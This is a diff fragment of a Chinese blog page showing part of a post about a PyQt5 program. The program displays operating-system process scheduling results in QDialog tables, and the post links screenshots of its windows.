+<p>每个算法都放入一个QDialog窗体内，每个窗体都是一个6×7的表格来展示内容。6行分别是四个进程的执行结果、标题和总结（总结包括平均周转总和、带权周转时间总和、平均周转时间、带权平均周转时间）；7列分别是进程号、到达时间、服务时间、开始运行时间、完成运行时间、周转时间、带权周转时间</p>
+<p>由于设计代码较多、较杂，这里只展示比较实用的部分：</p>
+<ul>
+<li><p>表格设置为不可修改，该窗体只是起到结果展示的作用，这样设置就不会因为误操作引起的一系列麻烦</p>
+</li>
+<li><p>设置部分单元格合并，合并的单元格用于显示平均周转时间、带权平均周转时间的结果</p>
+</li>
+<li><p>将设置好的行、列数进行自动拉伸，填充表格区域，使每一行每一列的单元格大小一致，表格看上去更加清晰</p>
+</li>
+<li><p>隐藏行头标签，不隐藏列头标签，使运算结果看起来更加清楚</p>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/3-5.png" alt="3-5"></p>
+<p>通过向MainWindow窗口内添加了5个PushButton，来分别对应于4个调度算法和1个查看执行进程参数。那么就需要实现点击不同的PushButton，跳转到分别与之对应的算法，这个功能通过另外一个Python文件来实现。代码如下：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/3-7.png" alt="3-7"></p>
+<h1 id="四、程序最后运行结果"><a href="#四、程序最后运行结果" class="headerlink" title="四、程序最后运行结果"></a>四、程序最后运行结果</h1><p>MainWindow窗口</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/4-2.png" alt="3-8"></p>
+<p>窗口的各个部分的简单解释</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/4-1.png" alt="4-1"></p>
+<p>多个窗口的跳转</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/4-7.png" alt="4-7"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/4-8.png" alt="4-8"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/4-9.png" alt="4-9"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PyQt5/4-10.png" alt="4-10"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">基础知识点</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/09/01/Python — PyQt5库的初次应用/">展开全文 >></a>
         </p>
       
 
